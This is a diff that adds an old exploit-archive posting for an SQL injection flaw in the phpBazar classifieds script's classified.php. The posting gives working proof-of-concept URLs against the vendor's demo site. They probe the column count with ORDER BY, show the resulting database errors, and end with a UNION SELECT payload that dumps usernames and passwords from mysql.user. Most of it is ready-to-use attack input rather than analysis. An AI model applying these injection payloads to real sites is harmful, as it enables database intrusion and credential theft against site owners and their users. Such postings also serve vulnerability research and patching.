@@ -1,0 +1,31 @@
+phpBazar SQL Injection Vulnerability all versions
+by:  e.wiZz!
+info: Bosnian Idiot FTW!
+
+In the wild....
+*********************************************************************
+Script site : http://www.smartisoft.com/
+
+Vulnerability:
+http://inthewild.com/<INSTALL PATH>/classified.php?catid=x&subcatid=x&adid=x SQL INJECTION
+
+PoC on demo site:
+
+http://www.phpbazar.com/bazar/classified.php?catid=2&subcatid=5&adid=832 order by 911/*
+Unknown column '911' in 'order clause'
+
+http://www.phpbazar.com/bazar/classified.php?catid=2&subcatid=5&adid=832 order by 67/*
+Unknown column '67' in 'order clause'
+
+http://www.phpbazar.com/bazar/classified.php?catid=2&subcatid=5&adid=832 order by 66/*
+Error : Database Query Error
+
+...so its 66...omg :D
+you can find columns this like:
+http://www.phpbazar.com/bazar/classified.php?catid=2&subcatid=5&adid=832 union select sum(somecolumn) from users--
+
+username,password:
+
+http://www.xxx.com/bazar/classified.php?catid=2&subcatid=5&adid=832 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,username,password,53,54,55,56,57,58,59,60,61,62,63,64,65,66 from mysql.user/*
+
+# milw0rm.com [2008-08-20]
